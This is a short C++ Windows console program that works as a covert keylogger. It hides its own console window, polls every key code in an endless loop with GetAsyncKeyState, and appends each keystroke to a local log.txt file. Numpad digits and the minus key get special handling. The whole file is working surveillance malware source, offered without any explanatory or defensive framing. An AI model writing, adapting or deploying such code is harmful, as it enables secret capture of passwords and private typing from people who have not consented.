// ConsoleApplication3.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <fstream>
#include<Windows.h>
#include<string>
#include<iostream>

using namespace std;

void hide_window() {
	HWND console;
	AllocConsole();
	console = FindWindowA("ConsoleWindowClass", 0);
	ShowWindow(console, 0);
}

void write_to_log(std::string text) {
	ofstream log;
	log.open("log.txt", fstream::app);
	log << text;
	log.close();
}

bool check_keys(int key) {
	switch (key) {
	case VK_NUMPAD0: {
		write_to_log("0");
		break;
	}
	case VK_NUMPAD1: {
		write_to_log("1");
		break;
	}
	case VK_NUMPAD2: {
		write_to_log("2");
		break;
	}
	case VK_NUMPAD3: {
		write_to_log("3");
		break;
	}
	case VK_NUMPAD4: {
		write_to_log("4");
		break;
	}
	case VK_NUMPAD5: {
		write_to_log("5");
		break;
	}
	case VK_NUMPAD6: {
		write_to_log("6");
		break;
	}
	case VK_NUMPAD7: {
		write_to_log("7");
		break;
	}
	case VK_NUMPAD8: {
		write_to_log("8");
		break;
	}
	case VK_NUMPAD9: {
		write_to_log("9");
		break;
	}
	case VK_SUBTRACT: {
		write_to_log("-");
		break;
	}
	default: return false;
	}
}

int main()
{
	hide_window();
	char key;
	while (1) {
		for (key = 8; key <= 255; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (check_keys(key) == NULL) {
					ofstream log;
					log.open("log.txt", fstream::app);
					log << key;
					log.close();
				}
			}
		}
	}
	system("pause");
	return 0;
}

